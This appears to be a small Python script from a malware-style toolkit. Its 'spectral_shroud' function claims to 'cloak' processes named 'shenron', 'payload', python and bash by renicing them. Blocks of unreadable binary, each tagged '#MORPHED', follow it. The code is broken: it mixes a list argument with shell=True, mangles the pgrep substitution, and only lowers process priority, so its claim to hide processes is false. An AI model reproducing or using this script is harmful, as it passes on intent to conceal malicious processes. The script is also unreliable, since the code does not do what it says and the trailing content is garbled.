#!/usr/bin/env python3
import subprocess

def spectral_shroud():
    processes = ["shenron", "payload", "python", "bash"]
    for proc in processes:
        subprocess.run(["pgrep", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["renice", "+10", "-p", "$(pgrep " + proc + ")"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[âœ“] Processes cloaked in spectral shroud.")

if __name__ == "__main__":
    spectral_shroud()

ª-Ò¹§î©Õ“„ªÕ„º	øAşŒÕ*33Ì6óĞ÷ƒciPdÚÀê{#MORPHED

Œß¥h½|fp‚Eë©"Ñ‡èşŸ¬±–SKõ{ºwö#MORPHED

uŒüÒçŠc4GÃîv
[‡:Y½ œ#MORPHED
